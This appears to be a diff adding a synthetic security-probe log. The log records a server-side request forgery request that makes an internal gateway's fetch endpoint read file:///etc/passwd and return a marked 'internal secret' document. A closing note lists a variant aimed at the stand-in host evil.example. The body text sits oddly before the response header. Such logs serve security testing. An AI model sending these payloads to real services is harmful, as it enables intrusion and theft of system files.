@@ -1,0 +1,16 @@
+== REQUEST ==
+GET /fetch?url=file%3A%2F%2F%2Fetc%2Fpasswd HTTP/1.1
+Host: svc-api-gw:8002
+User-Agent: tanyin-b20-probe
+
+<html>fetch GTSSRF-01 synthetic internal doc: internal-secret-doc</html>
+== RESPONSE ==
+status=200
+latency_ms=None
+Server: BaseHTTP/0.6 Python/3.12.14
+Date: Wed, 07 Oct 2026 12:11:37 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 72
+
+
+[note] extra form of svc-api-gw/fetch?url=http://evil.example
